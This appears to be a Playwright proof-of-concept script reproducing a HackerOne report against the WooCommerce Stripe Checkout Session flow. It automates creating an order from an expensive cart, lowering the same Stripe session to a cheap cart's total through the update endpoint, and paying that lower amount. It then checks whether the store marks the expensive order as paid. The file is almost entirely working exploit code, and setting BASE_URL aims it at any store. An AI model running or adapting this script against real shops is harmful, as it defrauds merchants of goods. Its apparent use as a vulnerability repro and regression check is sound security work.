#!/usr/bin/env node


// This script is an end-to-end repro for the Checkout Session amount-manipulation
// HackerOne report: https://hackerone.com/reports/3835686
//
// 1. Opens the site
//      URL: BASE_URL
//
//   2. Finds products
//      If EXPENSIVE_PRODUCT_ID and CHEAP_PRODUCT_ID are set, it uses those directly.
//      Otherwise it calls Woo Store API:
//      GET /wp-json/wc/store/v1/products?per_page=100
//
//   3. Reads cart and cart nonce
//      Woo Store API:
//      GET /wp-json/wc/store/v1/cart
//
//   4. Builds the expensive cart
//      Woo Store API:
//      POST /wp-json/wc/store/v1/cart/remove-item for existing cart items
//      POST /wp-json/wc/store/v1/cart/add-item with expensive product ID and HIGH_QTY
//
//   5. Loads checkout and reads Stripe frontend config/nonces
//      Page URL:
//      /checkout/
//      Browser data:
//      window.wc.wcSettings.getSetting('stripe_data')
//
//   6. Creates the Stripe Checkout Session through Woo
//      Woo AJAX endpoint:
//      POST /?wc-ajax=wc_stripe_create_checkout_session
//      This returns session_id and client_secret.
//      The script itself does not call Stripe REST here; Woo’s server-side handler calls Stripe.
//
//   7. Initializes Stripe Checkout in the browser
//      Stripe.js:
//      window.Stripe(publishableKey)
//      stripe.initCheckout({ clientSecret, adaptivePricing: { allowed: true } })
//      checkout.loadActions()
//      Then it calls Stripe.js actions:
//      updateEmail()
//      updateBillingAddress()
//      createPaymentElement().mount(...)
//
//   8. Fills card details
//      Stripe iframe fields inside the mounted Payment Element.
//      No direct Woo endpoint. This is Stripe.js UI interaction.
//
//   9. Creates the Woo order from the expensive cart
//      Woo Store API:
//      POST /wp-json/wc/store/v1/checkout
//      Payment data includes:
//      payment_method=stripe
//      wc_stripe_checkout_session_id=<created session id>
//      wc_stripe_selected_upe_payment_type=card
//
//   10. Changes cart to the cheap product
//      Woo Store API:
//      POST /wp-json/wc/store/v1/cart/remove-item
//      POST /wp-json/wc/store/v1/cart/add-item with cheap product ID and LOW_QTY
//
//   11. Attempts to lower the same Checkout Session
//      Stripe.js wrapper:
//      window.__wcstripeReproActions.runServerUpdate(...)
//      Inside that callback it calls Woo AJAX:
//      POST /?wc-ajax=wc_stripe_update_checkout_session
//      Body includes:
//      security=<update nonce>
//      checkout_session_id=<same session id>
//      Woo’s server-side endpoint calls Stripe to update the Checkout Session line items.
//
//   12. Confirms payment if the update lowered the session
//      Stripe.js:
//      window.__wcstripeReproActions.confirm({ returnUrl, redirect: 'if_required', ... })
//      This confirms/pays the Checkout Session through Stripe.js, not Woo REST.
//
//   13. Polls the Woo order status
//      Woo Store API:
//      GET /wp-json/wc/store/v1/order/{orderId}?key={orderKey}&billing_email={email}
//
//   14. Prints the result
//      Reports whether:
//      the Stripe session was lowered to the cheap cart total, Stripe marked it paid, and Woo marked the expensive order processing or completed.

import { pathToFileURL } from 'node:url';
import path from 'node:path';

const config = {
	baseUrl: process.env.BASE_URL || 'https://stripe.local',
	repoDir: process.env.REPO_DIR || process.cwd(),
	headless: process.env.HEADLESS !== 'false',
	expensiveProductId: process.env.EXPENSIVE_PRODUCT_ID
		? Number( process.env.EXPENSIVE_PRODUCT_ID )
		: null,
	cheapProductId: process.env.CHEAP_PRODUCT_ID
		? Number( process.env.CHEAP_PRODUCT_ID )
		: null,
	highQuantity: Number( process.env.HIGH_QTY || 10 ),
	lowQuantity: Number( process.env.LOW_QTY || 1 ),
	pollSeconds: Number( process.env.POLL_SECONDS || 90 ),
	card: {
		number: process.env.CARD_NUMBER || '4242424242424242',
		expiry: process.env.CARD_EXPIRY || '1234',
		cvc: process.env.CARD_CVC || '123',
	},
	failOnVulnerable: process.env.FAIL_ON_VULNERABLE === 'true',
};

const importPlaywright = async () => {
	const playwrightPath = path.join(
		config.repoDir,
		'node_modules/playwright/index.js'
	);
	return import( pathToFileURL( playwrightPath ).href );
};

const moneyFromCart = ( cart ) => {
	const totals = cart?.totals || {};
	const decimals = Number( totals.currency_minor_unit ?? 2 );
	const amount =
		Number( totals.total_price || 0 ) / Math.pow( 10, decimals );

	return `${ totals.currency_symbol || '$' }${ amount.toFixed(
		decimals
	) } ${ totals.currency_code || '' }`.trim();
};

const cartMinorTotal = ( cart ) => Number( cart?.totals?.total_price || 0 );

const sessionMinorTotalForCurrency = ( session, currencyCode ) => {
	const normalizedCurrency = String( currencyCode || '' ).toLowerCase();
	const currencyOption = session?.currencyOptions?.find(
		( option ) => option.currency === normalizedCurrency
	);

	if ( currencyOption ) {
		return currencyOption.minorUnitsAmount;
	}

	if ( session?.currency === normalizedCurrency ) {
		return session?.total?.total?.minorUnitsAmount;
	}

	return undefined;
};

const sessionDisplayTotalForCurrency = ( session, currencyCode ) => {
	const normalizedCurrency = String( currencyCode || '' ).toLowerCase();
	const currencyOption = session?.currencyOptions?.find(
		( option ) => option.currency === normalizedCurrency
	);

	return currencyOption?.amount || session?.total?.total?.amount;
};

const redactSessionId = ( id ) =>
	id ? `${ id.slice( 0, 12 ) }...${ id.slice( -6 ) }` : null;

const sameOriginUrl = ( pathName ) => new URL( pathName, config.baseUrl ).href;

const defaultAddress = ( email ) => ( {
	first_name: 'Paid',
	last_name: 'Repro',
	company: '',
	address_1: '123 Main St',
	address_2: '',
	city: 'New York',
	state: 'NY',
	postcode: '10001',
	country: 'US',
	email,
	phone: '5555555555',
} );

const stripeBillingContact = {
	name: 'Paid Repro',
	address: {
		country: 'US',
		line1: '123 Main St',
		city: 'New York',
		state: 'NY',
		postal_code: '10001',
	},
};

const paymentElementOptions = {
	layout: 'tabs',
	fields: {
		billingDetails: {
			name: 'never',
			email: 'never',
			phone: 'auto',
			address: {
				country: 'never',
				line1: 'never',
				line2: 'never',
				city: 'never',
				state: 'never',
				postalCode: 'never',
			},
		},
	},
	wallets: {
		applePay: 'never',
		googlePay: 'never',
	},
};

async function getCart( page ) {
	return page.evaluate( async () => {
		const response = await window.fetch( '/wp-json/wc/store/v1/cart', {
			credentials: 'same-origin',
		} );

		return {
			nonce: response.headers.get( 'Nonce' ),
			status: response.status,
			ok: response.ok,
			json: await response.json(),
		};
	} );
}

async function storePost( page, pathName, body ) {
	const cart = await getCart( page );
	const response = await page.evaluate(
		async ( { requestPath, requestBody, nonce } ) => {
			const result = await window.fetch(
				`/wp-json/wc/store/v1/${ requestPath }`,
				{
					method: 'POST',
					credentials: 'same-origin',
					headers: {
						'Content-Type': 'application/json',
						Nonce: nonce,
					},
					body: JSON.stringify( requestBody ),
				}
			);
			const text = await result.text();
			let json;

			try {
				json = JSON.parse( text );
			} catch {
				json = { raw: text };
			}

			return {
				status: result.status,
				ok: result.ok,
				json,
			};
		},
		{
			requestPath: pathName,
			requestBody: body,
			nonce: cart.nonce,
		}
	);

	if ( ! response.ok ) {
		throw new Error(
			`Store API ${ pathName } failed: ${ response.status } ${ JSON.stringify(
				response.json
			) }`
		);
	}

	return response.json;
}

async function setCartToProduct( page, productId, quantity ) {
	const cart = ( await getCart( page ) ).json;

	for ( const item of cart.items || [] ) {
		await storePost( page, 'cart/remove-item', { key: item.key } );
	}

	await storePost( page, 'cart/add-item', {
		id: productId,
		quantity,
	} );

	return ( await getCart( page ) ).json;
}

async function findProducts( page ) {
	if ( config.expensiveProductId && config.cheapProductId ) {
		return {
			high: { id: config.expensiveProductId, name: 'EXPENSIVE_PRODUCT_ID' },
			low: { id: config.cheapProductId, name: 'CHEAP_PRODUCT_ID' },
		};
	}

	const products = await page.evaluate( async () => {
		const response = await window.fetch(
			'/wp-json/wc/store/v1/products?per_page=100',
			{ credentials: 'same-origin' }
		);

		if ( ! response.ok ) {
			throw new Error(
				`Unable to fetch products from Store API: ${ response.status }`
			);
		}

		return response.json();
	} );

	const purchasable = products
		.filter( ( product ) => product.is_purchasable !== false )
		.filter( ( product ) => Number( product.prices?.price || 0 ) > 0 )
		.sort(
			( a, b ) =>
				Number( a.prices.price || 0 ) -
				Number( b.prices.price || 0 )
		);

	if ( purchasable.length === 0 ) {
		throw new Error(
			'No purchasable Store API products found. Set EXPENSIVE_PRODUCT_ID and CHEAP_PRODUCT_ID.'
		);
	}

	return {
		low: config.cheapProductId
			? { id: config.cheapProductId, name: 'CHEAP_PRODUCT_ID' }
			: purchasable[ 0 ],
		high: config.expensiveProductId
			? { id: config.expensiveProductId, name: 'EXPENSIVE_PRODUCT_ID' }
			: purchasable[ purchasable.length - 1 ],
	};
}

async function getStripeDataFromCheckout( page ) {
	await page.goto( sameOriginUrl( '/checkout/' ), {
		waitUntil: 'domcontentloaded',
	} );
	await page.waitForFunction( () =>
		Boolean( window.wc?.wcSettings?.getSetting( 'stripe_data' ) )
	);
	await page.waitForFunction( () => typeof window.Stripe === 'function' );

	const stripeData = await page.evaluate( () =>
		window.wc.wcSettings.getSetting( 'stripe_data' )
	);

	for ( const key of [
		'key',
		'createCheckoutSessionNonce',
		'updateCheckoutSessionNonce',
	] ) {
		if ( ! stripeData?.[ key ] ) {
			throw new Error( `Missing stripe_data.${ key } on checkout page.` );
		}
	}

	if ( ! stripeData.isAdaptivePricingEnabled ) {
		throw new Error(
			'Adaptive Pricing is not enabled on this checkout page.'
		);
	}

	return stripeData;
}

async function checkoutSessionAjax( page, action, params ) {
	return page.evaluate(
		async ( { ajaxAction, ajaxParams } ) => {
			const response = await window.fetch(
				`/?wc-ajax=wc_stripe_${ ajaxAction }_checkout_session`,
				{
					method: 'POST',
					credentials: 'same-origin',
					headers: {
						'Content-Type':
							'application/x-www-form-urlencoded; charset=UTF-8',
					},
					body: new URLSearchParams( ajaxParams ),
				}
			);
			const text = await response.text();
			let json;

			try {
				json = JSON.parse( text );
			} catch {
				json = { raw: text };
			}

			return {
				status: response.status,
				ok: response.ok,
				json,
			};
		},
		{
			ajaxAction: action,
			ajaxParams: params,
		}
	);
}

async function initializeStripeCheckout( page, stripeData, clientSecret, email ) {
	await page.evaluate(
		async ( {
			publishableKey,
			sessionClientSecret,
			customerEmail,
			billingContact,
			elementOptions,
		} ) => {
			const stripe = window.Stripe( publishableKey );
			const checkout = stripe.initCheckout( {
				clientSecret: sessionClientSecret,
				adaptivePricing: { allowed: true },
			} );
			const loadedActions = await checkout.loadActions();

			if ( loadedActions.type !== 'success' ) {
				throw new Error(
					`loadActions failed: ${
						loadedActions.error?.message || loadedActions.type
					}`
				);
			}

			window.__wcstripeReproActions = loadedActions.actions;
			await loadedActions.actions.updateEmail( customerEmail );
			await loadedActions.actions.updateBillingAddress( billingContact );

			const host = document.createElement( 'div' );
			host.id = 'wcstripe-repro-payment-element';
			host.style.cssText =
				'position:absolute;left:0;top:0;width:760px;min-height:650px;background:white;z-index:999999;padding:20px;';
			document.body.appendChild( host );

			checkout
				.createPaymentElement( elementOptions )
				.mount( '#wcstripe-repro-payment-element' );
		},
		{
			publishableKey: stripeData.key,
			sessionClientSecret: clientSecret,
			customerEmail: email,
			billingContact: stripeBillingContact,
			elementOptions: paymentElementOptions,
		}
	);
}

async function fillCardDetails( page ) {
	const paymentIframe = page
		.locator(
			'#wcstripe-repro-payment-element iframe[name^="__privateStripeFrame"]'
		)
		.filter( { visible: true } )
		.first();

	await paymentIframe.waitFor( { state: 'visible', timeout: 60000 } );
	const paymentFrame = paymentIframe.contentFrame();

	await paymentFrame.locator( '[name="number"]' ).fill( config.card.number );
	await paymentFrame.locator( '[name="expiry"]' ).fill( config.card.expiry );
	await paymentFrame.locator( '[name="cvc"]' ).fill( config.card.cvc );
}

async function updateCheckoutSessionFromCurrentCart(
	page,
	updateNonce,
	checkoutSessionId
) {
	return page.evaluate(
		async ( { nonce, sessionId } ) =>
			window.__wcstripeReproActions.runServerUpdate( async () => {
				const response = await window.fetch(
					'/?wc-ajax=wc_stripe_update_checkout_session',
					{
						method: 'POST',
						credentials: 'same-origin',
						headers: {
							'Content-Type':
								'application/x-www-form-urlencoded; charset=UTF-8',
						},
						body: new URLSearchParams( {
							security: nonce,
							checkout_session_id: sessionId,
						} ),
					}
				);

				return response.json();
			} ),
		{
			nonce: updateNonce,
			sessionId: checkoutSessionId,
		}
	);
}

async function confirmCheckoutSession( page, returnUrl, email ) {
	return page.evaluate(
		async ( { orderReturnUrl, customerEmail, billingContact } ) =>
			window.__wcstripeReproActions.confirm( {
				returnUrl: orderReturnUrl,
				redirect: 'if_required',
				email: customerEmail,
				billingAddress: billingContact,
			} ),
		{
			orderReturnUrl: returnUrl,
			customerEmail: email,
			billingContact: stripeBillingContact,
		}
	);
}

async function lookupOrder( page, orderId, orderKey, billingEmail ) {
	return page.evaluate(
		async ( { id, key, email } ) => {
			const query = new URLSearchParams( {
				key,
				billing_email: email,
			} );
			const response = await window.fetch(
				`/wp-json/wc/store/v1/order/${ id }?${ query }`,
				{ credentials: 'same-origin' }
			);
			const text = await response.text();
			let json;

			try {
				json = JSON.parse( text );
			} catch {
				json = { raw: text.slice( 0, 500 ) };
			}

			return {
				status: response.status,
				ok: response.ok,
				json,
			};
		},
		{
			id: orderId,
			key: orderKey,
			email: billingEmail,
		}
	);
}

async function pollOrder( page, orderId, orderKey, billingEmail ) {
	const start = Date.now();
	const samples = [];

	while ( Date.now() - start <= config.pollSeconds * 1000 ) {
		const response = await lookupOrder( page, orderId, orderKey, billingEmail );
		const sample = {
			t_seconds: Math.round( ( Date.now() - start ) / 1000 ),
			http_status: response.status,
			status: response.json?.status,
			total_minor_units: response.json?.totals?.total_price,
			payment_result:
				response.json?.payment_result?.payment_status ||
				response.json?.payment_result?.status,
		};
		samples.push( sample );

		if ( sample.status && ! [ 'pending', 'failed' ].includes( sample.status ) ) {
			break;
		}

		await page.waitForTimeout( 5000 );
	}

	return samples;
}

async function main() {
	const playwright = await importPlaywright();
	const { chromium } = playwright.default || playwright;
	const browser = await chromium.launch( { headless: config.headless } );
	const context = await browser.newContext( {
		ignoreHTTPSErrors: true,
		viewport: { width: 1280, height: 1000 },
	} );
	const page = await context.newPage();
	page.setDefaultTimeout( 60000 );

	const email = `wcstripe-repro-${ Date.now() }@example.test`;
	const address = defaultAddress( email );

	try {
		await page.goto( config.baseUrl, { waitUntil: 'domcontentloaded' } );

		const products = await findProducts( page );
		const highCart = await setCartToProduct(
			page,
			products.high.id,
			config.highQuantity
		);
		const stripeData = await getStripeDataFromCheckout( page );
		const createResponse = await checkoutSessionAjax( page, 'create', {
			security: stripeData.createCheckoutSessionNonce,
		} );

		if ( ! createResponse.ok || ! createResponse.json?.success ) {
			throw new Error(
				`Checkout Session create failed: ${ createResponse.status } ${ JSON.stringify(
					createResponse.json
				) }`
			);
		}

		const checkoutSessionId = createResponse.json.data.session_id;
		const clientSecret = createResponse.json.data.client_secret;

		await initializeStripeCheckout( page, stripeData, clientSecret, email );
		await fillCardDetails( page );

		const checkoutResponse = await storePost( page, 'checkout', {
			billing_address: address,
			shipping_address: address,
			payment_method: 'stripe',
			payment_data: [
				{ key: 'payment_method', value: 'stripe' },
				{ key: 'save_payment_method', value: 'no' },
				{
					key: 'wc_stripe_checkout_session_id',
					value: checkoutSessionId,
				},
				{
					key: 'wc_stripe_selected_upe_payment_type',
					value: 'card',
				},
			],
			customer_note: '',
			extensions: {},
			additional_fields: {},
		} );

		const returnUrl = checkoutResponse?.payment_result?.redirect_url;
		const orderId = checkoutResponse?.order_id;
		const orderKey = returnUrl
			? new URL( returnUrl ).searchParams.get( 'key' )
			: null;

		if ( ! orderId || ! orderKey || ! returnUrl ) {
			throw new Error(
				`Unexpected checkout response: ${ JSON.stringify( checkoutResponse ) }`
			);
		}

		const lowCart = await setCartToProduct(
			page,
			products.low.id,
			config.lowQuantity
		);
		const updateResponse = await updateCheckoutSessionFromCurrentCart(
			page,
			stripeData.updateCheckoutSessionNonce,
			checkoutSessionId
		);
		const cartCurrency = lowCart?.totals?.currency_code;
		const updatedSessionTotal = sessionMinorTotalForCurrency(
			updateResponse?.session,
			cartCurrency
		);
		const updateLoweredSession =
			updateResponse?.type === 'success' &&
			updatedSessionTotal === cartMinorTotal( lowCart );

		let confirmResponse = null;
		let orderPollSamples = [];

		if ( updateLoweredSession ) {
			confirmResponse = await confirmCheckoutSession( page, returnUrl, email );
			orderPollSamples = await pollOrder( page, orderId, orderKey, email );
		}

		const finalOrderSample = orderPollSamples[ orderPollSamples.length - 1 ];
		const vulnerable =
			updateLoweredSession &&
			confirmResponse?.type === 'success' &&
			confirmResponse?.session?.status?.paymentStatus === 'paid' &&
			[ 'processing', 'completed' ].includes( finalOrderSample?.status );

		const result = {
			base_url: config.baseUrl,
			products: {
				high: {
					id: products.high.id,
					name: products.high.name,
					quantity: config.highQuantity,
				},
				low: {
					id: products.low.id,
					name: products.low.name,
					quantity: config.lowQuantity,
				},
			},
			high_cart: {
				total_minor_units: cartMinorTotal( highCart ),
				total_display: moneyFromCart( highCart ),
			},
			checkout_session: {
				id_redacted: redactSessionId( checkoutSessionId ),
			},
			order_created_from_high_cart: {
				id: orderId,
				status: checkoutResponse.status,
				payment_result_status:
					checkoutResponse?.payment_result?.payment_status ||
					checkoutResponse?.payment_result?.status,
				total_minor_units: cartMinorTotal( highCart ),
			},
			low_cart: {
				total_minor_units: cartMinorTotal( lowCart ),
				total_display: moneyFromCart( lowCart ),
			},
			session_update: {
				type: updateResponse?.type,
				lowered_to_low_cart: updateLoweredSession,
				currency: cartCurrency,
				total_minor_units: updatedSessionTotal,
				total_display: sessionDisplayTotalForCurrency(
					updateResponse?.session,
					cartCurrency
				),
			},
			stripe_confirm: confirmResponse
				? {
						type: confirmResponse.type,
						status_type: confirmResponse?.session?.status?.type,
						payment_status:
							confirmResponse?.session?.status?.paymentStatus,
						total_minor_units: sessionMinorTotalForCurrency(
							confirmResponse?.session,
							cartCurrency
						),
						total_display: sessionDisplayTotalForCurrency(
							confirmResponse?.session,
							cartCurrency
						),
						error: confirmResponse?.error?.message,
				  }
				: null,
			order_poll_samples: orderPollSamples,
			final_order_sample: finalOrderSample,
			vulnerable,
		};

		console.log( JSON.stringify( result, null, 2 ) );

		if ( vulnerable && config.failOnVulnerable ) {
			process.exitCode = 2;
		}
	} finally {
		await browser.close();
	}
}

main().catch( ( error ) => {
	console.error( error.stack || error.message || String( error ) );
	process.exitCode = 1;
} );
